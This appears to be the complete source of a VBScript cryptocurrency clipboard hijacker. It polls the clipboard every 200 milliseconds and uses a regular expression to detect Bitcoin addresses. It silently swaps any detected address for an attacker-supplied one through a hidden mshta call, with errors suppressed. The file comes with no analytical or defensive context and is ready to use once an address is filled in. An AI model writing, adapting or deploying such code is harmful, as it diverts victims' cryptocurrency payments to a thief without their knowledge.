BTC = "Your BTC Address"

On Error Resume Next
Set re = New RegExp
         With re
            .Pattern    = "\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"
            .IgnoreCase = False
            .Global     = False
End With
Set objHTML = CreateObject("htmlfile")
do
wscript.sleep(200)
CB = objHTML.ParentWindow.ClipboardData.GetData("text")
If re.Test(CB) Then
If InStr(CB, BTC) > 0 Then
Else
SetB(BTC)
End If
End If
loop
Function SetB(input)
    CreateObject("WScript.Shell").Run _
      "mshta.exe javascript:eval(""document.parentWindow.clipboardData.setData('text','" _
      & Replace(Replace(Replace(input, "'", "\\u0027"), """","\\u0022"),Chr(13),"\\r\\n") & "');window.close()"")", _
      0,True
End Function